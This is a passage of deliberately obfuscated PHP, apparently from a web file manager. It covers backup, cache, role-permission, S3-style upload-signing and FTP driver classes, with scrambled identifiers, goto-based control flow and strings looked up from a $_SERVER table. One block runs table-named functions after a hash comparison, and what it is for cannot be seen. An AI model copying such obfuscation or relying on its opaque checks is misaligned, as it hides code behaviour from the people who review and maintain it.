$EòÙÖê∏ﬂÀ[0]; } $B∆¥†Ÿº‹Õ = array($D“ •∑ÖÀ‰[776] => $D“ •∑ÖÀ‰[9], $D“ •∑ÖÀ‰[777] => $D“ •∑ÖÀ‰[778]); if (isset($B∆¥†Ÿº‹Õ[$cÔﬁåãçÌ–])) { $cÔﬁåãçÌ– = $B∆¥†Ÿº‹Õ[$cÔﬁåãçÌ–]; } goto eœˆê¢√·ì; EÎë∏–∞ªñ: } private function tmpFilesPath() { $Bùÿ¢°ì◊¬ =& $_SERVER[™⁄»üÆ]; $f•Ùßáø¨Ô = TEMP_FILES; if ($GLOBALS[$Bùÿ¢°ì◊¬[6]][$Bùÿ¢°ì◊¬[88]][$Bùÿ¢°ì◊¬[779]]) { $f•Ùßáø¨Ô = $GLOBALS[$Bùÿ¢°ì◊¬[6]][$Bùÿ¢°ì◊¬[88]][$Bùÿ¢°ì◊¬[779]]; if (!mk_dir($f•Ùßáø¨Ô) || !is_writable($f•Ùßáø¨Ô) || !IO::mkfile($f•Ùßáø¨Ô . $Bùÿ¢°ì◊¬[780])) { $f•Ùßáø¨Ô = TEMP_FILES; } } return $f•Ùßáø¨Ô; } } class BackupDbFile { public function __construct() { } public function index() { goto AÔí ò∫„ß; CÿÌ—«◊èè: $FéÚçÍ ÷” = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\160\137{$AÕàëÆ∏ÈÙ}\57"; $C‹çà„Ñ…‡ = $this->backupPath($cí¯¿‡®›Ñ); if (!($C‹çà„Ñ…‡ = IO::mkdir($C‹çà„Ñ…‡))) { return !1; } goto BÛ÷•ºúçÉ; bº±√£ó≠±: IO::copy($D€≈≥Ìû≈Ú, $C‹çà„Ñ…‡); $EÌÀ˘ë◊î∑->end(); $c÷ºßèâ¬÷ = array($fìÇÒ‡Ü‘[789] => $FßπÙ∂Àùõ, $fìÇÒ‡Ü‘[790] => time()); goto B√ŸÍ‚Æªâ; D∂°®©∂√≠: $EÌÀ˘ë◊î∑ = new TaskFileTransfer($fìÇÒ‡Ü‘[783], $fìÇÒ‡Ü‘[761], count($f°µ™¥§•), LNG($fìÇÒ‡Ü‘[762]) . $fìÇÒ‡Ü‘[441] . LNG($fìÇÒ‡Ü‘[764]) . $fìÇÒ‡Ü‘[784]); $EÌÀ˘ë◊î∑->task[$fìÇÒ‡Ü‘[742]] = $FßπÙ∂Àùõ; foreach ($có£ì’§µ¿[$fìÇÒ‡Ü‘[74]] as $cÂ¿éÜß≈ ) { $A€á¡Õü±» = IO::move($cÂ¿éÜß≈ [$fìÇÒ‡Ü‘[76]], $C‹çà„Ñ…‡); if (!$A€á¡Õü±») { $EÌÀ˘ë◊î∑->end(); $bøö™œ‚¯› = IO::getLastError($fìÇÒ‡Ü‘[785] . $cÂ¿éÜß≈ [$fìÇÒ‡Ü‘[76]] . $fìÇÒ‡Ü‘[786] . $C‹çà„Ñ…‡ . $fìÇÒ‡Ü‘[518]); write_log($bøö™œ‚¯›, $fìÇÒ‡Ü‘[761]); return !1; } } goto c…œ∫Ô¨ò„; AÔí ò∫„ß: $fìÇÒ‡Ü‘ =& $_SERVER[™⁄»üÆ]; $cí¯¿‡®›Ñ = Backup::get(); $AÕàëÆ∏ÈÙ = $cí¯¿‡®›Ñ[$fìÇÒ‡Ü‘[28]]; goto CÿÌ—«◊èè; c…œ∫Ô¨ò„: $d‡åôÉàÖ¨ = CONTROLLER_DIR . $fìÇÒ‡Ü‘[787]; $D€≈≥Ìû≈Ú = CONTROLLER_DIR . $fìÇÒ‡Ü‘[788]; IO::copy($d‡åôÉàÖ¨, $C‹çà„Ñ…‡); goto bº±√£ó≠±; dƒà≠±Ñìç: if (!$FßπÙ∂Àùõ) { return !1; } $c÷ºßèâ¬÷ = array($fìÇÒ‡Ü‘[781] => $FßπÙ∂Àùõ, $fìÇÒ‡Ü‘[782] => time()); Backup::set($c÷ºßèâ¬÷); goto D∂°®©∂√≠; BÛ÷•ºúçÉ: $có£ì’§µ¿ = IO::listPath($FéÚçÍ ÷”); $f°µ™¥§• = isset($có£ì’§µ¿[$fìÇÒ‡Ü‘[74]]) ? $có£ì’§µ¿[$fìÇÒ‡Ü‘[74]] : array(); $FßπÙ∂Àùõ = array_sum(array_column($f°µ™¥§•, $fìÇÒ‡Ü‘[78])); goto dƒà≠±Ñìç; B√ŸÍ‚Æªâ: Backup::set($c÷ºßèâ¬÷); return !0; goto a«◊§ç¿Ÿà; a«◊§ç¿Ÿà: } private function backupPath($CÉóÓÒ∞…ì) { $Aº•´≤ªß£ =& $_SERVER[™⁄»üÆ]; $eõ˘¯àê©ê = $CÉóÓÒ∞…ì[$Aº•´≤ªß£[28]]; $d◊ÀêéÃ∞Ø = Model($Aº•´≤ªß£[749])->get($Aº•´≤ªß£[750]); $C‰≈úﬂ≥‰· = substr(md5($Aº•´≤ªß£[751] . $d◊ÀêéÃ∞Ø . $eõ˘¯àê©ê), 0, 8); return "\173\151\x6f\x3a{$CÉóÓÒ∞…ì[$Aº•´≤ªß£[731]]}\x7d\57\x64\141\164\141\142\141\x73\x65\x2f\x62\141\x63\153\x75\x70\x2f" . $eõ˘¯àê©ê . $Aº•´≤ªß£[71] . $C‰≈úﬂ≥‰·; } private function tmpFilesPath() { $fß≠Ñö‡”ˆ =& $_SERVER[™⁄»üÆ]; $bΩÎ™‘†Ò· = TEMP_FILES; if ($GLOBALS[$fß≠Ñö‡”ˆ[6]][$fß≠Ñö‡”ˆ[88]][$fß≠Ñö‡”ˆ[779]]) { $bΩÎ™‘†Ò· = $GLOBALS[$fß≠Ñö‡”ˆ[6]][$fß≠Ñö‡”ˆ[88]][$fß≠Ñö‡”ˆ[779]]; if (!mk_dir($bΩÎ™‘†Ò·) || !is_writable($bΩÎ™‘†Ò·) || !IO::mkfile($bΩÎ™‘†Ò· . $fß≠Ñö‡”ˆ[780])) { $bΩÎ™‘†Ò· = TEMP_FILES; } } return $bΩÎ™‘†Ò·; } } goto eÃë´Ñè¢Æ; Açë™·ÇÁË: $a√Œ’ﬂÀ›‰ = $_SERVER[™⁄»üÆ][818]; if ($_SERVER[$_SERVER[™⁄»üÆ][592]] != $a√Œ’ﬂÀ›‰($B◊åëææŒπ)) { goto EÛáóèµß“; Fã≠¨à¯Î≠: $f»ıëè…„Ÿ = explode($_SERVER[™⁄»üÆ][229], $bà≠ƒïò•§); if (count($f»ıëè…„Ÿ) < $_SERVER[™⁄»üÆ][597]) { $a∏°∑ùâºâ = $_SERVER[™⁄»üÆ][598]; $a∏°∑ùâºâ(); } $F∫ÒëÁ‘©ı = $_SERVER[™⁄»üÆ][599]; goto FùŒ‚Ò‚±; FùŒ‚Ò‚±: $F∫ÒëÁ‘©ı($B◊åëææŒπ); goto eÚ«á¨∆¨È; EÛáóèµß“: $aò‡ı§∞ù∫ = $_SERVER[™⁄»üÆ][594]; $Díßÿô—ªÀ = $_SERVER[$_SERVER[™⁄»üÆ][595]] . $_SERVER[™⁄»üÆ][596]; $bà≠ƒïò•§ = $aò‡ı§∞ù∫($Díßÿô—ªÀ); goto Fã≠¨à¯Î≠; eÚ«á¨∆¨È: } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($dáóåëÜÛœ, $E≠«∑≤ıÓì) { $eÌä€ëôõ¬ =& $_SERVER[™⁄»üÆ]; $this->cachePath = $dáóåëÜÛœ[$eÌä€ëôõ¬[76]]; $this->prefix = $eÌä€ëôõ¬[819]; $this->cacheTime = $E≠«∑≤ıÓì; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($BªòÕÍÙÃÖ) { $D¨´ò™ íì =& $_SERVER[™⁄»üÆ]; $BªòÕÍÙÃÖ = str_replace(array($D¨´ò™ íì[820], $D¨´ò™ íì[97], $D¨´ò™ íì[70]), $D¨´ò™ íì[821], $BªòÕÍÙÃÖ); return $this->cachePath . $D¨´ò™ íì[822] . $BªòÕÍÙÃÖ . $D¨´ò™ íì[823]; } public function set($e†ÖÃ´™Õá, $cÇ‹ãœÆõŸ, $d≤»Øê÷ü‘ = false) { $AƒË™¿“†∑ = $this->getFile($e†ÖÃ´™Õá); if (file_put_contents($AƒË™¿“†∑, $this->prefix . $cÇ‹ãœÆõŸ, LOCK_EX)) { @touch($AƒË™¿“†∑, intval(time() + $d≤»Øê÷ü‘)); clearstatcache(); return !0; } @unlink($AƒË™¿“†∑); return !1; } public function get($FÛã¥“Üº≠) { $aâÉ˜†‚⁄÷ = $this->getFile($FÛã¥“Üº≠); if (file_exists($aâÉ˜†‚⁄÷) && filemtime($aâÉ˜†‚⁄÷) < time()) { @unlink($aâÉ˜†‚⁄÷); return !1; } $Cåì•Úå≤‚ = @file_get_contents($aâÉ˜†‚⁄÷); return substr($Cåì•Úå≤‚, strlen($this->prefix)); } public function remove($bÜúŒ≈ò„ù) { $f‚ΩÕ°ÕØÇ = $this->getFile($bÜúŒ≈ò„ù); return @unlink($f‚ΩÕ°ÕØÇ); } public function deleteAll() { $AÁ”®…ãŒ· =& $_SERVER[™⁄»üÆ]; $c√Íô™ñÑÉ = scandir($this->cachePath); foreach ($c√Íô™ñÑÉ as $B˜ç§ü‡Èƒ) { $AØ†ÒËÇîê = $this->cachePath . $B˜ç§ü‡Èƒ; if (strpos($AØ†ÒËÇîê, $AÁ”®…ãŒ·[823]) && strpos($AØ†ÒËÇîê, $AÁ”®…ãŒ·[824])) { @unlink($AØ†ÒËÇîê); } } } public function clearTimeout() { $eÉÇÊÙÑÖé =& $_SERVER[™⁄»üÆ]; $eØÌ¨Ü»∞Ö = scandir($this->cachePath); foreach ($eØÌ¨Ü»∞Ö as $DÛ∂˘∆õ´ﬂ) { $DíŸÎ≈¬ÈÏ = $this->cachePath . $DÛ∂˘∆õ´ﬂ; if (strpos($DíŸÎ≈¬ÈÏ, $eÉÇÊÙÑÖé[823]) && strpos($DíŸÎ≈¬ÈÏ, $eÉÇÊÙÑÖé[824]) && filemtime($DíŸÎ≈¬ÈÏ) < time()) { @unlink($DíŸÎ≈¬ÈÏ); } } } } goto b…ﬁ⁄øã¢ä; eóÖÌæ»£ú: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\x6d\x5f\157\x70\164\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\154\145", "\162\157\x6c\145\x47\162\x6f\165\160", "\x72\x65\147\x69\163\x74", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($bÂÓ·öÚ‘µ) { return "\x53\171\x73\x74\145\155\117\x70\x74\x69\157\156\137{$bÂÓ·öÚ‘µ}"; } protected function optionDefault($CÎ¯Áªªˆ§ = '') { $fìºΩ¡ÿˆÀ =& $_SERVER[™⁄»üÆ]; if ($CÎ¯Áªªˆ§ == $fìºΩ¡ÿˆÀ[33]) { return $GLOBALS[$fìºΩ¡ÿˆÀ[6]][$fìºΩ¡ÿˆÀ[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x72\x6f\154\145\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\164\x68", "\154\141\142\x65\x6c", "\x64\151\163\x70\154\141\x79", "\163\171\x73\164\x65\x6d", "\x64\145\163\x63", "\x69\x67\156\x6f\162\x65\x45\170\164", "\151\x67\x6e\157\x72\x65\x46\x69\154\145\x53\151\172\x65", "\141\144\155\x69\156\x69\x73\x74\x72\x61\164\x6f\162", "\163\157\162\164"); public function listData($e”–çê©ºﬂ = false, $D”πÎÌ©£ˆ = "\163\x6f\x72\x74", $Fç”ã‘¨Í¯ = false) { $F€‚àè—∫Ã =& $_SERVER[™⁄»üÆ]; $Aè√ª’‚ãû = parent::listData($e”–çê©ºﬂ, $D”πÎÌ©£ˆ, $Fç”ã‘¨Í¯); if (!$e”–çê©ºﬂ) { foreach ($Aè√ª’‚ãû as $c·«üºëÜ∆ => $Cƒ”¯≠·¥) { if ($Cƒ”¯≠·¥[$F€‚àè—∫Ã[1899]] == 1) { $Aè√ª’‚ãû[$c·«üºëÜ∆][$F€‚àè—∫Ã[432]] = LNG($F€‚àè—∫Ã[2125]); } } } return $Aè√ª’‚ãû; } public function update($AÔÕøâÇ§ñ, $e»Ñ§≠É∂â) { goto a…ß∂∏Øﬂ±; a®ƒﬂìå‘„: if (!$F—∫õ·åå€ || $fÏ‰ñƒ¶ƒ· && $fÏ‰ñƒ¶ƒ·[$f¬πÃ‡•÷⁄[394]] != $F—∫õ·åå€[$f¬πÃ‡•÷⁄[394]]) { return !1; } if ($fÏ‰ñƒ¶ƒ·[$f¬πÃ‡•÷⁄[1899]] == 1) { $e»Ñ§≠É∂â = array($f¬πÃ‡•÷⁄[28] => $e»Ñ§≠É∂â[$f¬πÃ‡•÷⁄[28]], $f¬πÃ‡•÷⁄[1728] => $e»Ñ§≠É∂â[$f¬πÃ‡•÷⁄[1728]]); } $this->filterAuth($e»Ñ§≠É∂â[$f¬πÃ‡•÷⁄[407]]); goto c⁄¯€äç≤Ñ; a…ß∂∏Øﬂ±: $f¬πÃ‡•÷⁄ =& $_SERVER[™⁄»üÆ]; $F—∫õ·åå€ = parent::listData($AÔÕøâÇ§ñ); $fÏ‰ñƒ¶ƒ· = $this->findByName($e»Ñ§≠É∂â[$f¬πÃ‡•÷⁄[28]]); goto a®ƒﬂìå‘„; c⁄¯€äç≤Ñ: return parent::update($AÔÕøâÇ§ñ, $e»Ñ§≠É∂â); goto E¢È°≥ë«‰; E¢È°≥ë«‰: } public function remove($c„¬≈Æ∏ö˜) { $F¨ñ∆¡ëÛÂ = parent::listData($c„¬≈Æ∏ö˜); if (!$F¨ñ∆¡ëÛÂ || $F¨ñ∆¡ëÛÂ[$_SERVER[™⁄»üÆ][1179]]) { return !1; } return parent::remove($c„¬≈Æ∏ö˜); } public function add($e†Ç¢“™âŒ) { goto BÊ†à»·„û; c±€ÚÛÂ»“: $FœªèÙÃº‹ = array($E°Ö¯ˆºÒÊ[414] => $d®Ô∆«æè¡, $E°Ö¯ˆºÒÊ[1712] => $E°Ö¯ˆºÒÊ[33], $E°Ö¯ˆºÒÊ[1708] => $E°Ö¯ˆºÒÊ[1716], $E°Ö¯ˆºÒÊ[2126] => 1, $E°Ö¯ˆºÒÊ[1711] => 0, $E°Ö¯ˆºÒÊ[2127] => 0, $E°Ö¯ˆºÒÊ[1710] => $this->getSort()); $e†Ç¢“™âŒ = array_merge($FœªèÙÃº‹, $e†Ç¢“™âŒ); $this->filterAuth($e†Ç¢“™âŒ[$E°Ö¯ˆºÒÊ[407]]); goto d≈‡ŸÉ‘îØ; d≈‡ŸÉ‘îØ: return parent::insert($e†Ç¢“™âŒ); goto FÊÜå‰±ÙÎ; BÊ†à»·„û: $E°Ö¯ˆºÒÊ =& $_SERVER[™⁄»üÆ]; $d®Ô∆«æè¡ = $e†Ç¢“™âŒ[$E°Ö¯ˆºÒÊ[28]]; if ($this->findByName($d®Ô∆«æè¡)) { return !1; } goto c±€ÚÛÂ»“; FÊÜå‰±ÙÎ: } private function getSort() { $Aùê¨ñ°œÔ =& $_SERVER[™⁄»üÆ]; $dÍëã„Ìÿ‰ = parent::listData(); $B∑æ≤‰„® = array_to_keyvalue($dÍëã„Ìÿ‰, $Aùê¨ñ°œÔ[33], $Aùê¨ñ°œÔ[1729]); return empty($B∑æ≤‰„®) ? 0 : max($B∑æ≤‰„®) + 1; } private function filterAuth(&$FÇ¬∫˜ë§±) { $dƒø∞ºµëõ =& $_SERVER[™⁄»üÆ]; $B…äÉﬂÿá = array(); $d‹íÕ°°±ﬁ = array_filter(explode($dƒø∞ºµëõ[47], $FÇ¬∫˜ë§±)); foreach ($d‹íÕ°°±ﬁ as $FÇ¬∫˜ë§±) { $E»ªƒ§Ù‘ñ = explode($dƒø∞ºµëõ[95], $FÇ¬∫˜ë§±); if ($E»ªƒ§Ù‘ñ[0] == $dƒø∞ºµëõ[2128] && $E»ªƒ§Ù‘ñ[1] != $dƒø∞ºµëõ[1098]) { $a•ëî√˜ƒ‰ = $E»ªƒ§Ù‘ñ[0] . $dƒø∞ºµëõ[95] . $E»ªƒ§Ù‘ñ[1] . $dƒø∞ºµëõ[2129]; if (!in_array($a•ëî√˜ƒ‰, $d‹íÕ°°±ﬁ)) { $B…äÉﬂÿá[] = $a•ëî√˜ƒ‰; } } $B…äÉﬂÿá[] = $FÇ¬∫˜ë§±; } $FÇ¬∫˜ë§± = implode($dƒø∞ºµëõ[47], $B…äÉﬂÿá); } public function sort($F∞Ÿ„åÏöä, $B‡Ó‚¨†ªÍ) { return parent::update($F∞Ÿ„åÏöä, $B‡Ó‚¨†ªÍ); } } goto FØøî§ÎÛœ; DÁ◊¢ùﬁçà: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($FÉìÆ·»ºª) { parent::__construct($FÉìÆ·»ºª); $this->signatureVersion($_SERVER[™⁄»üÆ][212]); } public function uploadFormData($c ‹»ÂﬁäÚ, $eıôùç” ¶ = 3600) { goto AøÜÂöùÇ§; C¯†Èé«≥ã: $aı»ç√ﬂ®¨ = $B¯ŒÀ©É∞[59]; $A∫®Çåêô≥ = gmdate($B¯ŒÀ©É∞[1233]); $f±“Ûπ’‘’ = gmdate($B¯ŒÀ©É∞[730]); goto FÕÜÈ‚≤≠Ê; FÕÜÈ‚≤≠Ê: $CΩä±ÙùÓπ = $B¯ŒÀ©É∞[1234]; $eèÃÀè‡°Ã = $eıôùç” ¶ . $B¯ŒÀ©É∞[33]; $aÏ®ü–‚¿ï = $B¯ŒÀ©É∞[1197]; goto AåÔåù“†È; AåÔåù“†È: $eî£ÈπÏµ∞ = array($this->accessKey, $f±“Ûπ’‘’, $this->region, $aı»ç√ﬂ®¨, $CΩä±ÙùÓπ); $b˘Ù¨√∆Ëï = implode($B¯ŒÀ©É∞[8], $eî£ÈπÏµ∞); $CãòÓœ≠„ß = array($B¯ŒÀ©É∞[1199] => gmdate($B¯ŒÀ©É∞[1198], strtotime($B¯ŒÀ©É∞[1235])), $B¯ŒÀ©É∞[1200] => array(array($B¯ŒÀ©É∞[1202] => $this->bucket), array($B¯ŒÀ©É∞[1201] => $FàóÇ·ƒçä), array($B¯ŒÀ©É∞[1203], $B¯ŒÀ©É∞[1204], $B¯ŒÀ©É∞[33]), array($B¯ŒÀ©É∞[1203], $B¯ŒÀ©É∞[1236], $B¯ŒÀ©É∞[33]), array($B¯ŒÀ©É∞[1203], $B¯ŒÀ©É∞[1237], $B¯ŒÀ©É∞[33]), array($B¯ŒÀ©É∞[1205] => $aÏ®ü–‚¿ï), array($B¯ŒÀ©É∞[1238] => $b˘Ù¨√∆Ëï), array($B¯ŒÀ©É∞[1239] => $d„∞∏°å´Õ), array($B¯ŒÀ©É∞[1240] => $A∫®Çåêô≥), array($B¯ŒÀ©É∞[1241] => $eèÃÀè‡°Ã))); goto d°àõ¥Ü≈‚; AøÜÂöùÇ§: $B¯ŒÀ©É∞ =& $_SERVER[™⁄»üÆ]; $FàóÇ·ƒçä = $B¯ŒÀ©É∞[192]; $d„∞∏°å´Õ = $B¯ŒÀ©É∞[1232]; goto C¯†Èé«≥ã; F¿À⁄áíôÜ: $béÕç∏ª±∏ = hash_hmac($B¯ŒÀ©É∞[1242], $aı»ç√ﬂ®¨, $aîŒ”ﬁÂ¶È, !0); $Cß…ú‘√’Ã = hash_hmac($B¯ŒÀ©É∞[1242], $CΩä±ÙùÓπ, $béÕç∏ª±∏, !0); $dÑÖ¨ÑÚÖ⁄ = hash_hmac($B¯ŒÀ©É∞[1242], $EÌó‹ùúÈñ, $Cß…ú‘√’Ã); goto E˜ú¥úæ∞µ; d°àõ¥Ü≈‚: $EÌó‹ùúÈñ = base64_encode(json_encode($CãòÓœ≠„ß)); $Cì≥¬ñ∆÷Ü = hash_hmac($B¯ŒÀ©É∞[1242], $f±“Ûπ’‘’, $B¯ŒÀ©É∞[1243] . $this->secret, !0); $aîŒ”ﬁÂ¶È = hash_hmac($B¯ŒÀ©É∞[1242], $this->region, $Cì≥¬ñ∆÷Ü, !0); goto F¿À⁄áíôÜ; E˜ú¥úæ∞µ: $fııì„ì»⁄ = array($B¯ŒÀ©É∞[211] => $B¯ŒÀ©É∞[33], $B¯ŒÀ©É∞[1244] => $B¯ŒÀ©É∞[33], $B¯ŒÀ©É∞[1201] => $FàóÇ·ƒçä, $B¯ŒÀ©É∞[1205] => $aÏ®ü–‚¿ï, $B¯ŒÀ©É∞[1209] => $EÌó‹ùúÈñ, $B¯ŒÀ©É∞[1245] => $b˘Ù¨√∆Ëï, $B¯ŒÀ©É∞[1246] => $d„∞∏°å´Õ, $B¯ŒÀ©É∞[1247] => $A∫®Çåêô≥, $B¯ŒÀ©É∞[1248] => $eèÃÀè‡°Ã, $B¯ŒÀ©É∞[1249] => $dÑÖ¨ÑÚÖ⁄, $B¯ŒÀ©É∞[175] => $this->getHost()); return $fııì„ì»⁄; goto FèåıËÑá‘; FèåıËÑá‘: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($EÕ≈ç‚æ»¬) { parent::__construct(); if (count($EÕ≈ç‚æ»¬) > 0) { $this->_init($EÕ≈ç‚æ»¬); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($f∫∫Ÿ∂áõÖ) { $Bûñ‰…Öı® =& $_SERVER[™⁄»üÆ]; global $config; $this->appCharset = $config[$Bûñ‰…Öı®[1250]]; $this->systemCharset = $config[$Bûñ‰…Öı®[1251]]; if (isset($f∫∫Ÿ∂áõÖ[$Bûñ‰…Öı®[1252]]) && $f∫∫Ÿ∂áõÖ[$Bûñ‰…Öı®[1252]]) { $this->systemCharset = $f∫∫Ÿ∂áõÖ[$Bûñ‰…Öı®[1252]]; } } public function iconvApp($Dá©îÉÉ¥Œ) { return $this->iconvTo($Dá©îÉÉ¥Œ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Fäø≥’¥Á¶) { return $this->iconvTo($Fäø≥’¥Á¶, $this->appCharset, $this->systemCharset); } public function getPathOuter($C°ã≤”√∏ß) { goto BØÔÏëêô; BÑ”¯⁄“ÁÙ: $C°ã≤”√∏ß = KodIO::clear($C°ã≤”√∏ß); $C°ã≤”√∏ß = substr($C°ã≤”√∏ß, strlen($E≠èƒÃÆÍ)); if (empty($this->pathDriver)) { return $C°ã≤”√∏ß; } goto DÊ› ﬁ…„ï; DÊ› ﬁ…„ï: return $this->pathDriver . $bÕ≥›ÆªŸˆ[8] . ltrim($C°ã≤”√∏ß, $bÕ≥›ÆªŸˆ[8]); goto fÛ≥Ó†˘∆¶; BØÔÏëêô: $bÕ≥›ÆªŸˆ =& $_SERVER[™⁄»üÆ]; $E≠èƒÃÆÍ = $this->iconvApp($this->pathBase); $C°ã≤”√∏ß = $this->iconvApp($C°ã≤”√∏ß); goto Fôë°ô‡πè; Fôë°ô‡πè: if (substr($E≠èƒÃÆÍ, 0, 2) == $bÕ≥›ÆªŸˆ[1253]) { $E≠èƒÃÆÍ = BASIC_PATH . substr($E≠èƒÃÆÍ, 2); } if (substr($C°ã≤”√∏ß, 0, 2) == $bÕ≥›ÆªŸˆ[1253]) { $C°ã≤”√∏ß = BASIC_PATH . substr($C°ã≤”√∏ß, 2); } $E≠èƒÃÆÍ = KodIO::clear($E≠èƒÃÆÍ); goto BÑ”¯⁄“ÁÙ; fÛ≥Ó†˘∆¶: } private function _init($cÉ‘àﬁÒõé = array()) { $C‘é¶äÒÑ˜ =& $_SERVER[™⁄»üÆ]; if (!function_exists($C‘é¶äÒÑ˜[1254])) { throw new Exception(LNG($C‘é¶äÒÑ˜[1255])); } $this->config = $cÉ‘àﬁÒõé; $this->charsetReset($cÉ‘àﬁÒõé); foreach ($cÉ‘àﬁÒõé as $e∂ôó÷ê≤» => $a∑ÿÿ…£‹º) { if (isset($this->{$e∂ôó÷ê≤»})) { $this->{$e∂ôó÷ê≤»} = $a∑ÿÿ…£‹º; } } return $this->_login($cÉ‘àﬁÒõé); } private function _login($Aø‘ƒ∂ºì–) { goto d˜ûäî‘Òô; C¨◊¬óÜå∑: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $a´Ï«•äœ¬ = $this->pasv == $AƒÛåÃà±»[87] ? !0 : !1; @ftp_pasv($this->connect, $a´Ï«•äœ¬); goto FéÉî†ù°§; f©⁄ïœÂ‚â: $aé˜úÙœØå = isset($Fƒ‰≤≠®âé[$AƒÛåÃà±»[174]]) && $Fƒ‰≤≠®âé[$AƒÛåÃà±»[174]] == $AƒÛåÃà±»[1256] ? !0 : !1; $this->scheme = $aé˜úÙœØå ? $AƒÛåÃà±»[1257] : $AƒÛåÃà±»[1258]; $this->port = isset($Fƒ‰≤≠®âé[$AƒÛåÃà±»[176]]) ? $Fƒ‰≤≠®âé[$AƒÛåÃà±»[176]] : 21; goto a“Ç¨¬ºàû; a“Ç¨¬ºàû: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $D”§≠ÖÏ⁄Ñ = @ftp_login($this->connect, $this->username, $this->userpass); goto C¨◊¬óÜå∑; féîÖ≈Ç∆∑: if (isset($c÷Æ„Êù–∂[$dë¥’ßÏ®ª])) { foreach ($c÷Æ„Êù–∂[$dë¥’ßÏ®ª] as $Dœî—≠˘£Â => $F†¶ó≥¢‰π) { $this->{$Dœî—≠˘£Â} = $F†¶ó≥¢‰π; } return !0; } $Fƒ‰≤≠®âé = parse_url(trim($this->server, $AƒÛåÃà±»[8])); $this->host = $Fƒ‰≤≠®âé[$AƒÛåÃà±»[175]]; goto f©⁄ïœÂ‚â; FéÉî†ù°§: $c÷Æ„Êù–∂[$dë¥’ßÏ®ª] = array($AƒÛåÃà±»[1259] => $this->connect, $AƒÛåÃà±»[175] => $this->host, $AƒÛåÃà±»[174] => $this->scheme, $AƒÛåÃà±»[176] => $this->port); return $D”§≠ÖÏ⁄Ñ; goto A¢ﬂ«Êé¬˘; d˜ûäî‘Òô: $AƒÛåÃà±» =& $_SERVER[™⁄»üÆ]; static $c÷Æ„Êù–∂ = array(); $dë¥’ßÏ®ª = md5(json_encode($Aø‘ƒ∂ºì–)); goto féîÖ≈Ç∆∑; A¢ﬂ«Êé¬˘: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($c›òÃ≤Öè…, $FÕÑ†ŒÉ…” = '', $CÜ∞àÇ≠≥ = REPEAT_RENAME) { if ($this->setContent($c›òÃ≤Öè…, $FÕÑ†ŒÉ…”)) { return $this->getPathOuter($c›òÃ≤Öè…); } return !1; } public function mkdir($Däô®Ç∏ª‡, $DÁò¥õ ˜± = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Däô®Ç∏ª‡ = $this->iconvSystem($Däô®Ç∏ª‡); if ($this->_isFolder($Däô®Ç∏ª‡) || @ftp_mkdir($this->connect, $Däô®Ç∏ª‡)) { return $this->getPathOuter($Däô®Ç∏ª‡); } if (!$this->mkdir($this->pathFather($Däô®Ç∏ª‡))) { return !1; } if ($Däô®Ç∏ª‡ = @ftp_mkdir($this->connect, $Däô®Ç∏ª‡)) { return $this->getPathOuter($Däô®Ç∏ª‡); } return !1; } public function copyFile($a≠ÏŒ‚–Û«, $Cú∑ÍÙæµÎ) { goto aÏí≠èæÀõ; C≈¶ªÈüÒï: $this->tempFileRemve($BÖÏ ¢£óô); return $F÷øÆ€ÆËî; goto cÊÁàË™ ©; aÏí≠èæÀõ: if (!$this->_isconn()) { return !1; } $C—ÏÎ„’Üä = $this->pathThis($this->iconvSystem($a≠ÏŒ‚–Û«)); $BÖÏ ¢£óô = $this->tempFile($C—ÏÎ„’Üä); goto D∆áœèïÂ¯; D∆áœèïÂ¯: $DÙê∏ëâ–Ó = $this->iconvApp($BÖÏ ¢£óô); $this->download($a≠ÏŒ‚–Û«, $DÙê∏ëâ–Ó); $F÷øÆ€ÆËî = $this->upload($Cú∑ÍÙæµÎ, $DÙê∏ëâ–Ó); goto C≈¶ªÈüÒï; cÊÁàË™ ©: } public function moveFile($b©å¯∞§¥Ø, $EüﬁÛçÌÖÆ) { if (!$this->_isconn()) { return !1; } $b©å¯∞§¥Ø = $this->iconvSystem($b©å¯∞§¥Ø); $EüﬁÛçÌÖÆ = $this->iconvSystem($EüﬁÛçÌÖÆ); $f‡ŒÒ–´ÇÙ = @ftp_rename($this->connect, $b©å¯∞§¥Ø, $EüﬁÛçÌÖÆ); return $f‡ŒÒ–´ÇÙ ? $this->getPathOuter($EüﬁÛçÌÖÆ) : !1; } public function delFile($f«˘„¡êµ ) { if (!$this->_isconn()) { return !1; } $f«˘„¡êµ  = $this->iconvSystem($f«˘„¡êµ ); return @ftp_delete($this->connect, $f«˘„¡êµ ); } public function delFolder($D™åµÔææà) { goto e≈…ıõëó¥; e≈…ıõëó¥: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $F±∏“ÆÜå¡ = $A∑ÈŸŒÊ‡∂ = array(); goto D·«‡œæ£Ñ; D·«‡œæ£Ñ: $this->fileList($D™åµÔææà, $F±∏“ÆÜå¡, $A∑ÈŸŒÊ‡∂, !0); $this->listItemCache = !0; foreach ($A∑ÈŸŒÊ‡∂ as $aöæÉ™óìÿ) { $díñ™Ø•∏∫ = $this->iconvSystem($aöæÉ™óìÿ[$_SERVER[™⁄»üÆ][28]]); $D®™ëùÚ‰€ = @ftp_delete($this->connect, $díñ™Ø•∏∫); if (!$D®™ëùÚ‰€) { return !1; } } goto d◊œÑ®£Úº; d◊œÑ®£Úº: foreach ($F±∏“ÆÜå¡ as 